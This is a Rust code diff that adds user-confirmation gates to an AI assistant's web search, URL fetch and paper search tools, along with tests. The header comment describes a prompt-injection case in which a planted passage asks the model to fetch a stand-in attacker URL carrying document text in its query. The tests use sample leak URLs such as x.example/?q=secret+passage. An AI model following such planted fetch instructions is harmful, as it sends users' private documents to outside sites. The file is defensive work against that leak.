@@ -9,6 +9,18 @@
 //! Every call is audited with its query or URL (the tool-call arguments)
 //! and the sources it returned (a `retrieval` event).
 //!
+//! What a call sends away can carry what the run has read: a planted
+//! passage can ask for `fetch_url https://x.example/?q=<the passages>`. Once
+//! the session has had private content (passages in any run, opened
+//! document text, memories or history in a message, a message the app
+//! composed: [`ToolContext::private_content`]), a page is fetched without
+//! asking only when its URL is one of the run's web results or the user
+//! wrote it
+//! ([`fetch_needs_confirmation`]), and a search or paper query is sent
+//! without asking only when it is the user's own words
+//! ([`query_needs_confirmation`]); otherwise the user sees the full URL or
+//! query and decides.
+//!
 //! Search results are ranked by relevance to the query before the model
 //! sees them and weak matches are dropped
 //! ([`crate::harness::web::relevance`]). The model is told to cite only
@@ -21,7 +33,8 @@ use async_trait::async_trait;
 use serde_json::{json, Value};
 
 use super::{
-    req_str, CitedPassage, HostTool, ToolContext, ToolError, ToolOutput, WEB_UNTRUSTED_NOTICE,
+    req_str, ApprovalPreview, CitedPassage, HostTool, SessionGrant, ToolContext, ToolError,
+    ToolOutput, WEB_UNTRUSTED_NOTICE,
 };
 use crate::harness::events::RiskTier;
 use crate::harness::truncate_chars;
@@ -74,6 +87,78 @@ fn check_allowed(env: &dyn WebEnv) -> Result<(), ToolError> {
     match env.blocked() {
         Some(reason) => Err(ToolError::Forbidden(reason)),
         None => Ok(()),
+    }
+}
+
+/// `url` without surrounding whitespace or a trailing slash, for comparing.
+fn url_key(url: &str) -> &str {
+    url.trim().trim_end_matches('/')
+}
+
+/// Whether fetching `url` must be confirmed: once the session has had
+/// private content (`private`), unless `url` is one of the run's web results
+/// (`web_sources`) or appears in the user's own words.
+pub fn fetch_needs_confirmation(
+    url: &str,
+    private: bool,
+    web_sources: &[String],
+    user_words: Option<&str>,
+) -> bool {
+    if !private {
+        return false;
+    }
+    let wanted = url_key(url);
+    if wanted.is_empty() {
+        return true;
+    }
+    let known = web_sources.iter().any(|source| url_key(source) == wanted);
+    let typed = user_words.is_some_and(|words| words.contains(wanted));
+    !(known || typed)
+}
+
+/// Lowercase words separated by single spaces.
+fn words_key(text: &str) -> String {
+    text.split_whitespace()
+        .collect::<Vec<_>>()
+        .join(" ")
+        .to_lowercase()
+}
+
+/// Whether sending the search `query` away must be confirmed: once the
+/// session has had private content (`private`), unless the query is the
+/// user's own words (in their message, ignoring case and spacing). A
+/// rephrased query asks: telling a rephrasing apart from one that carries
+/// passage text is not reliable.
+pub fn query_needs_confirmation(query: &str, private: bool, user_words: Option<&str>) -> bool {
+    if !private {
+        return false;
+    }
+    let wanted = words_key(query);
+    wanted.is_empty() || !user_words.is_some_and(|words| words_key(words).contains(&wanted))
+}
+
+/// `url`'s origin as the approval card names it: scheme, host and port
+/// (`https://example.com:443`). `None` for anything but an http(s) URL with
+/// a host.
+pub fn url_origin(url: &str) -> Option<String> {
+    let parsed = url::Url::parse(url.trim()).ok()?;
+    if !matches!(parsed.scheme(), "http" | "https") {
+        return None;
+    }
+    let host = parsed.host_str().filter(|h| !h.is_empty())?;
+    let port = parsed.port_or_known_default()?;
+    Some(format!("{}://{host}:{port}", parsed.scheme()))
+}
+
+/// The prompt of a web call that sends `what` (a URL or query) away.
+fn send_preview(label: String, key: &str, what: &str) -> ApprovalPreview {
+    ApprovalPreview {
+        label: Some(label),
+        details: json!({
+            key: what,
+            "why": "This answer has read your documents. Check that this does not send \
+                    their text to another site.",
+        }),
     }
 }
 
@@ -165,6 +250,30 @@ impl HostTool for WebSearchTool {
     }
     fn tier(&self) -> RiskTier {
         RiskTier::Read
+    }
+    async fn must_confirm_in(&self, args: &Value, ctx: &ToolContext) -> Result<bool, ToolError> {
+        let query = req_str(args, "query", WEB_SEARCH)?;
+        Ok(query_needs_confirmation(
+            query,
+            ctx.private_content(),
+            ctx.user_words(),
+        ))
+    }
+    fn session_grant(&self, _args: &Value) -> Option<SessionGrant> {
+        Some(SessionGrant {
+            key: format!("tool:{WEB_SEARCH}"),
+            label: "Allow web search for this conversation".to_string(),
+            note: "Later searches in this conversation may quote your documents; they go to your search provider without asking."
+                .to_string(),
+        })
+    }
+    async fn preview(&self, args: &Value) -> Result<ApprovalPreview, ToolError> {
+        let query = req_str(args, "query", WEB_SEARCH)?;
+        Ok(send_preview(
+            format!("Search the web for “{}”", truncate_chars(query, 120)),
+            "query",
+            query,
+        ))
     }
 
     async fn execute(&self, args: Value, ctx: &ToolContext) -> Result<ToolOutput, ToolError> {
@@ -389,6 +498,30 @@ impl HostTool for FetchUrlTool {
     fn tier(&self) -> RiskTier {
         RiskTier::Read
     }
+    async fn must_confirm_in(&self, args: &Value, ctx: &ToolContext) -> Result<bool, ToolError> {
+        let url = req_str(args, "url", FETCH_URL)?;
+        Ok(fetch_needs_confirmation(
+            url,
+            ctx.private_content(),
+            &ctx.web_sources(),
+            ctx.user_words(),
+        ))
+    }
+    /// Only the exact origin of this URL, never fetching in general.
+    fn session_grant(&self, args: &Value) -> Option<SessionGrant> {
+        let origin = url_origin(args.get("url")?.as_str()?)?;
+        Some(SessionGrant {
+            key: format!("origin:{origin}"),
+            note: format!(
+                "Later pages from {origin} in this conversation may carry text from your documents in their address; they are fetched without asking."
+            ),
+            label: format!("Allow {origin} for this conversation"),
+        })
+    }
+    async fn preview(&self, args: &Value) -> Result<ApprovalPreview, ToolError> {
+        let url = req_str(args, "url", FETCH_URL)?;
+        Ok(send_preview(format!("Open {url}"), "url", url))
+    }
 
     async fn execute(&self, args: Value, ctx: &ToolContext) -> Result<ToolOutput, ToolError> {
         check_allowed(self.env.as_ref())?;
@@ -520,6 +653,30 @@ impl HostTool for SearchPapersTool {
     }
     fn tier(&self) -> RiskTier {
         RiskTier::Read
+    }
+    async fn must_confirm_in(&self, args: &Value, ctx: &ToolContext) -> Result<bool, ToolError> {
+        let query = req_str(args, "query", SEARCH_PAPERS)?;
+        Ok(query_needs_confirmation(
+            query,
+            ctx.private_content(),
+            ctx.user_words(),
+        ))
+    }
+    fn session_grant(&self, _args: &Value) -> Option<SessionGrant> {
+        Some(SessionGrant {
+            key: format!("tool:{SEARCH_PAPERS}"),
+            label: "Allow paper search for this conversation".to_string(),
+            note: "Later paper searches in this conversation may quote your documents; they go to the paper search services without asking."
+                .to_string(),
+        })
+    }
+    async fn preview(&self, args: &Value) -> Result<ApprovalPreview, ToolError> {
+        let query = req_str(args, "query", SEARCH_PAPERS)?;
+        Ok(send_preview(
+            format!("Search papers for “{}”", truncate_chars(query, 120)),
+            "query",
+            query,
+        ))
     }
 
     async fn execute(&self, args: Value, ctx: &ToolContext) -> Result<ToolOutput, ToolError> {
@@ -835,5 +992,204 @@ mod tests {
         assert!(out.text_for_model.contains("do not cite any paper"));
         assert_eq!(out.summary_for_ui, "No relevant papers found");
         assert_eq!(ctx.reserve_passages(1), 1, "no citation numbers were used");
+    }
+
+    #[test]
+    fn fetching_asks_once_passages_are_in_the_run_unless_the_url_is_known() {
+        let results = vec!["https://example.com/article".to_string()];
+        let user = Some("Summarise https://docs.example.org/guide/ for me");
+        // Nothing read yet: nothing private to send.
+        assert!(!fetch_needs_confirmation(
+            "https://x.example/?q=a",
+            false,
+            &[],
+            None
+        ));
+        // Passages read: an unknown URL asks, whatever it looks like.
+        for url in [
+            "https://x.example/?q=secret+passage",
+            "https://x.example/c2VjcmV0",
+            "https://example.com/article?leak=1",
+            "https://docs.example.org/guide/../x?d=1",
+        ] {
+            assert!(fetch_needs_confirmation(url, true, &results, user), "{url}");
+        }
+        // One of the run's web results, or a URL the user wrote, does not.
+        assert!(!fetch_needs_confirmation(
+            "https://example.com/article/",
+            true,
+            &results,
+            user
+        ));
+        assert!(!fetch_needs_confirmation(
+            "https://docs.example.org/guide",
+            true,
+            &results,
+            user
+        ));
+        assert!(fetch_needs_confirmation(" ", true, &results, user));
+    }
+
+    #[test]
+    fn queries_ask_once_passages_are_in_the_run_unless_they_are_the_users_words() {
+        let user = Some("What is SPANN   memory layout?");
+        assert!(!query_needs_confirmation("anything at all", false, None));
+        assert!(!query_needs_confirmation("spann memory", true, user));
+        assert!(!query_needs_confirmation(
+            "What is SPANN memory layout?",
+            true,
+            user
+        ));
+        assert!(query_needs_confirmation(
+            "spann memory layout benchmarks",
+            true,
+            user
+        ));
+        assert!(query_needs_confirmation(
+            "the confidential passage text",
+            true,
+            user
+        ));
+        assert!(query_needs_confirmation("spann", true, None));
+    }
+
+    #[tokio::test]
+    async fn web_tools_ask_with_the_full_url_or_query_after_passages() {
+        let (ctx, _rx) = ctx();
+        let ctx = ctx.with_scope(Arc::new(crate::harness::tools::RunScope {
+            own_words: Some("Read https://example.com/article please".to_string()),
+            ..Default::default()
+        }));
+        let fetch = FetchUrlTool::new(env(None), web_client());
+        let search = WebSearchTool::new(env(None), web_client());
+        let papers = SearchPapersTool::new(env(None), web_client());
+        let leak = json!({"url": "https://x.example/?q=private"});
+        assert!(!fetch.must_confirm_in(&leak, &ctx).await.unwrap());
+        assert!(!search
+            .must_confirm_in(&json!({"query": "private words"}), &ctx)
+            .await
+            .unwrap());
+
+        // A document passage enters the run.
+        let n = ctx.reserve_passages(1);
+        ctx.record_passage(CitedPassage {
+            n,
+            file: "notes.pdf".into(),
+            path: "C:/docs/notes.pdf".into(),
+            page: Some("1".into()),
+            web: false,
+            text: "private words".into(),
+            checkable: true,
+        });
+        assert!(fetch.must_confirm_in(&leak, &ctx).await.unwrap());
+        let shown = fetch.preview_in(&leak, &ctx).await.unwrap();
+        assert_eq!(
+            shown.label.as_deref(),
+            Some("Open https://x.example/?q=private")
+        );
+        assert_eq!(shown.details["url"], "https://x.example/?q=private");
+        assert!(!fetch
+            .must_confirm_in(&json!({"url": "https://example.com/article"}), &ctx)
+            .await
+            .unwrap());
+        for tool in [&search as &dyn HostTool, &papers] {
+            let query = json!({"query": "private words"});
+            assert!(
+                tool.must_confirm_in(&query, &ctx).await.unwrap(),
+                "{}",
+                tool.name()
+            );
+            assert_eq!(
+                tool.preview_in(&query, &ctx).await.unwrap().details["query"],
+                "private words"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn private_content_from_earlier_runs_or_the_message_still_asks() {
+        use crate::harness::tools::{RunPassages, RunScope};
+        let fetch = FetchUrlTool::new(env(None), web_client());
+        let leak = json!({"url": "https://x.example/?q=private"});
+        let session = Arc::new(RunPassages::new());
+        let (tx, _rx) = mpsc::unbounded_channel();
+        let first =
+            ToolContext::new("run-1", "step-1", tx.clone()).with_run_passages(Arc::clone(&session));
+        assert!(!fetch.must_confirm_in(&leak, &first).await.unwrap());
+        first.record_opened("C:/docs/a.pdf", "private words");
+        // The next run starts with no numbers, but the model still has them.
+        session.reset();
+        assert_eq!(session.issued(), 0);
+        let second =
+            ToolContext::new("run-2", "step-1", tx.clone()).with_run_passages(Arc::clone(&session));
+        assert!(fetch.must_confirm_in(&leak, &second).await.unwrap());
+
+        // A message carrying memories or history counts from its first call,
+        // and a URL in it is only the user's when it is in their own words.
+        let composed = ToolContext::new("run-3", "step-1", tx).with_scope(Arc::new(RunScope {
+            private_context: true,
+            question: Some("Earlier: https://x.example/?q=private".to_string()),
+            ..RunScope::default()
+        }));
+        assert!(composed.private_content());
+        assert_eq!(composed.user_words(), None);
+        assert!(fetch.must_confirm_in(&leak, &composed).await.unwrap());
+    }
+
+    #[test]
+    fn a_fetch_grant_names_exactly_one_origin() {
+        assert_eq!(
+            url_origin("https://Example.com/a?b=1").as_deref(),
+            Some("https://example.com:443")
+        );
+        assert_eq!(
+            url_origin("http://example.com:8080/x").as_deref(),
+            Some("http://example.com:8080")
+        );
+        assert_eq!(url_origin("ftp://example.com/x"), None);
+        assert_eq!(url_origin("not a url"), None);
+        let fetch = FetchUrlTool::new(env(None), web_client());
+        let grant = fetch
+            .session_grant(&json!({"url": "https://example.com/article"}))
+            .unwrap();
+        assert_eq!(grant.key, "origin:https://example.com:443");
+        assert_eq!(
+            grant.label,
+            "Allow https://example.com:443 for this conversation"
+        );
+        let other = fetch
+            .session_grant(&json!({"url": "https://example.com.evil.net/"}))
+            .unwrap();
+        assert_ne!(other.key, grant.key);
+        let search = WebSearchTool::new(env(None), web_client());
+        let papers = SearchPapersTool::new(env(None), web_client());
+        assert_ne!(
+            search.session_grant(&json!({})).unwrap().key,
+            papers.session_grant(&json!({})).unwrap().key
+        );
+    }
+
+    #[test]
+    fn a_pure_web_chat_does_not_arm_the_gate() {
+        let (ctx, _rx) = ctx();
+        let first = ctx.reserve_passages(2);
+        for n in first..first + 2 {
+            ctx.record_passage(CitedPassage {
+                n,
+                file: "Result".into(),
+                path: format!("https://example.com/{n}"),
+                page: None,
+                web: true,
+                text: "public".into(),
+                checkable: true,
+            });
+        }
+        assert!(!ctx.private_content());
+        assert!(!fetch_needs_confirmation(
+            "https://other.example/",
+            ctx.private_content(),
+            &ctx.web_sources(),
+            None
+        ));
     }
 }
